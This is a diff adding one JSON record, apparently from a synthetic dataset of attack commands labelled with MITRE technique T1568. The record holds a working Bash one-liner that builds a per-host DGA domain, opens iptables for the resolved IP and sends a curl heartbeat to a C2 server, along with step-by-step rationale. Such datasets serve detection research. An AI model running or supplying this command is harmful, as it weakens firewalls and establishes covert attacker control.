@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'hostid=$(hostname | sha1sum | cut -c1-6); d=\"$hostid.$(date -u +%Y%m%d).cloud-edge.biz\"; ip=$(dig +short A \"$d\" | shuf -n1); if [ -n \"$ip\" ]; then port=$(shuf -i 40000-65500 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --connect-timeout 4 --max-time 8 \"http://$d:$port/beat?hid=$hostid\"; fi'",
+  "explanation": "Derives a per-host DGA subdomain, resolves it to an IP, permits that IP on a randomized high port via iptables, and sends a brief heartbeat to establish C2 reachability.",
+  "rationale_steps": [
+    "Generate host-unique DGA subdomain tied to current date",
+    "Resolve to obtain the current C2 IP",
+    "Open iptables for the resolved IP and random high port",
+    "Send a short-lived heartbeat with curl to avoid long sessions"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-25462b7d",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
